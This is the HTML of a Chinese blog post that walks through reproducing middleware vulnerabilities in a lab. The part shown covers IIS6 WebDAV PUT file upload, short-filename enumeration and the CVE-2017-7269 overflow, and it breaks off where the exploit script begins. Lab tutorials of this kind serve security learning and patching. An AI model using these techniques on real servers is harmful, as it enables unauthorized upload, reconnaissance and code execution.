<!DOCTYPE html>
<html lang='zh-CN'>

<head>
  <meta name="generator" content="Hexo 5.4.2">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.14.0">
  <meta charset="utf-8">
  

  <meta http-equiv='x-dns-prefetch-control' content='on' />
  <link rel='dns-prefetch' href='https://fastly.jsdelivr.net'>
  <link rel="preconnect" href="https://fastly.jsdelivr.net" crossorigin>
  <link rel='dns-prefetch' href='//unpkg.com'>

  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" content="#f8f8f8">
  
  <title>中间件漏洞 - stday-K</title>

  
    <meta name="description" content="web中间件漏洞中间件是一种独立的系统软件或服务程序，分布式应用软件借助这种软件在不同的技术之间共享资源。中间件位于客户机&#x2F;服务器的操作系统之上，管理计算机资源和网络通讯。是连接两个独立应用程序或独立系统的软件。相连接的系统，即使它们具有不同的接口，但通过中间件相互之间仍能交换信息。执行中间件的一个关键途径是信息传递。通过中间件，应用程序可以工作于多平台或OS环境。（百度百科）  以下更">
<meta property="og:type" content="article">
<meta property="og:title" content="中间件漏洞">
<meta property="og:url" content="http://example.com/2022/11/06/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="stday-K">
<meta property="og:description" content="web中间件漏洞中间件是一种独立的系统软件或服务程序，分布式应用软件借助这种软件在不同的技术之间共享资源。中间件位于客户机&#x2F;服务器的操作系统之上，管理计算机资源和网络通讯。是连接两个独立应用程序或独立系统的软件。相连接的系统，即使它们具有不同的接口，但通过中间件相互之间仍能交换信息。执行中间件的一个关键途径是信息传递。通过中间件，应用程序可以工作于多平台或OS环境。（百度百科）  以下更">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504194244640.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504195629994.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504195839583.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504201428853.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504220017629.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504220600320.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504220750684.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504221402870.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220505164802051.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220505164900980.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220505181312281.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506212729791.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506182015511.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506182037345.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506182632418.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506184135949.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506193008301.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506194006550.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506194421991.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506213321933.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506213431696.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506213535314.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220506213726896.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507135815781.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507135718177.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507141453346.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507141628460.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507141914909.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507210241824.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507210110825.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507211526267.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507213452754.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507213503207.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507215143123.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507215205879.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507215429321.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507223513832.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507222102107.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507221800227.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507222213245.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220507223959923.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508144953146.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508150546350.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508155004552.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508163414214.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508180820059.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508181255517.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508183218374.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508183423117.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508184112013.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508184355167.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508225842050.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508220721260.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508220738292.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508221657803.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508225121857.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508225332955.png">
<meta property="og:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220508225714577.png">
<meta property="article:published_time" content="2022-11-06T15:36:04.000Z">
<meta property="article:modified_time" content="2022-12-18T13:13:15.487Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504194244640.png">
  
  

  <!-- feed -->
  

  
    
<link rel="stylesheet" href="/css/main.css">

  

  
    <link rel="shortcut icon" href="http://www.stdaybook.top/wp-content/uploads/2022/04/image-20220410182341271.png">
  

  

  


  
</head>

<body>
  




  <div class='l_body' id='start'>
    <aside class='l_left' layout='post'>
    

  

<header class="header">

<div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://fastly.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://avatars.githubusercontent.com/u/73050721?s=40&v=4" onerror="javascript:this.classList.add('error');this.src='https://fastly.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">stday-K</div></a></div>


<nav class="menu dis-select"></nav>
</header>


<div class="widgets">

<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">中间件漏洞</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#IIS%E6%BC%8F%E6%B4%9E"><span class="toc-text">IIS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PUT%E6%BC%8F%E6%B4%9E"><span class="toc-text">PUT漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E7%8C%9C%E8%A7%A3"><span class="toc-text">短文件名猜解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">远程代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE-CVE-2017-7269"><span class="toc-text">RCE-CVE-2017-7269</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-SYS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-MS15-034"><span class="toc-text">HTTP.SYS远程代码执行 (MS15-034)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache%E6%BC%8F%E6%B4%9E"><span class="toc-text">Apache漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-1"><span class="toc-text">解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx%E6%BC%8F%E6%B4%9E"><span class="toc-text">Nginx漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-2"><span class="toc-text">解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRLF%E6%B3%A8%E5%85%A5"><span class="toc-text">CRLF注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-text">目录穿越</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat%E6%BC%8F%E6%B4%9E"><span class="toc-text">Tomcat漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-CVE-2017-12615"><span class="toc-text">Tomcat 任意文件写入(CVE-2017-12615)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2019-0232%EF%BC%89"><span class="toc-text">Tomcat 远程代码执行（CVE-2019-0232）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-amp-%E5%90%8E%E5%8F%B0war%E9%83%A8%E7%BD%B2"><span class="toc-text">Tomcat 弱口令&amp;后台war部署</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jBoss%E6%BC%8F%E6%B4%9E"><span class="toc-text">jBoss漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JBoss-lt-x3D-4-x-JBossMQ-JMS-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-7504"><span class="toc-text">JBoss &lt;&#x3D;4.x JBossMQ JMS 反序列化漏洞(CVE-2017-7504)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JBoss-5-x-x2F-6-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12149%EF%BC%89"><span class="toc-text">JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JBoss-JMXInvokerServlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">JBoss JMXInvokerServlet 反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4-amp-%E5%90%8E%E5%8F%B0war%E9%83%A8%E7%BD%B2"><span class="toc-text">弱口令&amp;后台war部署</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebLogic%E6%BC%8F%E6%B4%9E"><span class="toc-text">WebLogic漏洞</span></a></li></ol></div></div></div>




</div>


    </aside>
    <div class='l_main'>
      

      


<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div><div id="post-meta">发布于&nbsp;<time datetime="2022-11-06T15:36:04.000Z">2022-11-06</time></div></div>

<article class='content md post'>
<h1 class="article-title"><span>中间件漏洞</span></h1>
<h1 id="web中间件漏洞"><a href="#web中间件漏洞" class="headerlink" title="web中间件漏洞"></a>web中间件漏洞</h1><p>中间件是一种独立的系统软件或服务程序，分布式应用软件借助这种软件在不同的技术之间共享资源。中间件位于客户机&#x2F;服务器的操作系统之上，管理计算机资源和网络通讯。是连接两个独立应用程序或独立系统的软件。相连接的系统，即使它们具有不同的接口，但通过中间件相互之间仍能交换信息。执行中间件的一个关键途径是信息传递。通过中间件，应用程序可以工作于多平台或OS环境。（百度百科）</p>
<ul>
<li><strong>以下更多是搭建环境和利用；对漏洞运行的原理分析很少，后面可能会补充</strong></li>
</ul>
<h2 id="IIS漏洞"><a href="#IIS漏洞" class="headerlink" title="IIS漏洞"></a>IIS漏洞</h2><ul>
<li><p><strong>简介</strong></p>
<p>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。最初是Windows NT版本的可选包，随后内置在Windows 2000、Windows XP  Professional和Windows Server 2003一起发行，但在Windows XP  Home版本上并没有IIS。<strong>IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</strong></p>
<p>IIS的安全脆弱性曾长时间被业内诟病，一旦IIS出现远程执行漏洞威胁将会非常严重。远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP  请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码，可以导致IIS服务器所在机器蓝屏或读取其内存中的机密数据</p>
</li>
<li><p>搭建环境</p>
<ul>
<li><p>安装windows2003</p>
<p><a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">MSDN, 我告诉你 - 做一个安静的工具站</a></p>
<p>下载windows2003</p>
<p>丢到虚拟机中，安装步骤，典型就行，直接安装光盘镜像，一路下一步；记得设置CD选项<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504194244640.png" alt="image-20220504194244640"></p>
</li>
<li><p>安装iis6</p>
<p>注意在双击“万维网服务”，从中还有选webDAV</p>
<p>图文版见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pandana/p/14850798.html">https://www.cnblogs.com/pandana/p/14850798.html</a></p>
<p>文字版</p>
<p>1.进入“控制面板”。</p>
<p>2.双击“添加或删除程序”。</p>
<p>3.单击“添加&#x2F;删除Windows组件”。</p>
<p>4.在“组件”列表框中，双击“应用程序服务器”。</p>
<p>5.勾选并双击“Internet信息服务(IIS)”。</p>
<p>6.从中选择“万维网服务”及“文件传输协议(FTP)服务”。</p>
<p>7.双击“万维网服务”，从中选择“ActiveServerPages”及“万维网服务”,webDAV。</p>
<p>安装好IIS后，接着设置Web服务器，具体做法为：</p>
<p>1.在“开始”菜单中选择“管理工具→Internet信息服务(IIS)管理器”。</p>
<p>2.在“Internet信息服务(IIS)管理器”中双击“本地计算机”。</p>
<p>3.右击“网站”，在弹出菜单中选择“新建→网站”，打开“网站创建向导”。</p>
<p>4.跟着来就行，<strong>网站访问权限记得给写入</strong></p>
<p><strong>记住快照</strong></p>
</li>
</ul>
</li>
</ul>
<h3 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h3><ul>
<li><p><strong>介绍</strong></p>
<p>IIS Server 在 Web 服务扩展中开启了 <strong>WebDAV</strong>[^1] ，配置了可以写入的权限，造成任意文件上传。</p>
<p>版本： IIS6.0</p>
</li>
</ul>
<p>[^1]:WebDAV 是 一种基于 HTTP 1.1协议的通信协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。</p>
<ul>
<li><p><strong>复现</strong></p>
<p>用OPTIONS方法访问</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504195629994.png" alt="image-20220504195629994"></p>
<p>存在PUT方法</p>
<p>再用PUT上传文件，成功返回201</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504195839583.png" alt="image-20220504195839583"></p>
<p>访问，成功；不要用php，服务器没php环境，无法解析会报错</p>
</li>
<li><p><strong>漏洞修复</strong></p>
<p>关闭WebDAV 和写权限</p>
</li>
</ul>
<h3 id="短文件名猜解"><a href="#短文件名猜解" class="headerlink" title="短文件名猜解"></a>短文件名猜解</h3><ul>
<li><p>短文件名</p>
<ul>
<li><p>格式</p>
<p>通常指较旧的Windows操作系统或DOS的文件命名限制</p>
<p>8指文件名最大长度为8</p>
<p>3指扩展名最大长度为3</p>
<p>若不符合以上限制则会以”<del>“作延长名称如”Program Files”会变成”Progra</del>1”</p>
<p>若同一文件夹有相似的名称，末端的数值则会自动递增</p>
</li>
<li><p>短文件名的命名规则</p>
<p>符合DOS短文件名规则的Windows下的长文件名不变。 </p>
<p>长文件名中的空格，在短文件名中被删除。</p>
<p>删除空格后的长文件名，若长度大于8个字符，则取前6个字符，后两个字符以”<del>#”代替，其中”#”为数字，数字根据前六个字符相同的文件名的个数顺延。若个数超过10个则取前5个字符，后三个字符以”</del>##”代替，其中”##”为两位数字，若个数大于100也依此规则替换。</p>
<p>对使用多个”．”隔开的长文件名，取最左端一段转换为短文件名，取最右一段前三个字符为扩展名。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504201428853.png" alt="image-20220504201428853"></p>
</li>
</ul>
</li>
<li><p><strong>介绍</strong></p>
<p>攻击者使用通配符*和?发生一个请求到IIS，当IIS接收到一个文件路径中包含~请求时，它的反应是不同的，即返回的HTTP状态码和错误信息不同。基于这个特点，可以根据HTTP的响应区分一个可用或者不可用的文件。访问构造的某个存在的短文件名，会返回404；访问构造的某个不存在的短文件名，会返回400（报错页面）</p>
<p>IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。</p>
</li>
<li><p><strong>复现</strong></p>
<p><strong>IIS8.0以下版本需要开启ASP.NET支持</strong>，IIS大于等于8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。<br>以下通过开启IIS6.0 ASP.NET后进行复现。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504220017629.png" alt="image-20220504220017629"></p>
<p>利用通配符来验证，<strong>注意短文件名后必须加上&#x2F;.aspx，才能触发短文件名规则</strong></p>
<p>404</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504220600320.png" alt="image-20220504220600320"></p>
<p>400</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504220750684.png" alt="image-20220504220750684"></p>
<p>可以通过python2环境的工具<a target="_blank" rel="noopener" href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS_shortname_Scanner</a>来实现</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220504221402870.png" alt="image-20220504221402870"></p>
</li>
<li><p><strong>修复</strong></p>
<ol>
<li><p>升级.net framework</p>
</li>
<li><p>修改注册表禁用短文件名功能</p>
<p>快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径：</p>
<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效</p>
</li>
<li><p>CMD关闭NTFS 8.3文件格式的支持</p>
</li>
</ol>
</li>
<li><p><strong>局限性</strong></p>
<ol>
<li><p>此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解；</p>
</li>
<li><p>如果文件名本身太短（无短文件名）也是无法猜解的；</p>
</li>
<li><p>如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；</p>
</li>
</ol>
</li>
</ul>
<h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><h4 id="RCE-CVE-2017-7269"><a href="#RCE-CVE-2017-7269" class="headerlink" title="RCE-CVE-2017-7269"></a>RCE-CVE-2017-7269</h4><ul>
<li><p><strong>介绍</strong></p>
<p>Windows server 2003 R2版本IIS6.0的WebDAV服务中的ScStorgPathFromUrl函数存在缓冲区溢出漏洞，远程攻击者通过以“if:&lt;http:&#x2F;&#x2F;“开头的长header PROPFIND请求，执行任意代码</p>
<p>在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发<strong>栈溢出</strong>，从而导致远程代码执行。</p>
<p>有能力的可以看<a target="_blank" rel="noopener" href="https://whereisk0shl.top/cve-2017-7269-iis6-interesting-exploit.html">漏洞分析</a></p>
</li>
<li><p><strong>范围</strong></p>
<p>在Windows 2003 R2（Microsoft(R) Windows(R) Server 2003, Enterprise Edition Service Pack 2）上使用IIS 6.0并开启WebDAV扩展</p>
</li>
<li><p><strong>复现</strong></p>
<p><strong>先快照</strong>，该exp的全采用默认路径即C:\Inetpub\wwwroot，所以需要将网站路径修改，也可以填充<code>在覆盖缓冲区的时候填充的字符长度要根据物理路径的长度来决定，且物理路径长度 + 填充字符的个数 = 114。</code>其他的问题见<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6485">https://xz.aliyun.com/t/6485</a></p>
<p>使用exp发送，然后利用wireshark抓取查看包信息(抓包然后用bp发送，会因为编码不同，出现错误)</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220505164802051.png" alt="image-20220505164802051"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://stday-123.oss-cn-hangzhou.aliyuncs.com/image-20220505164900980.png" alt="image-20220505164900980"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span 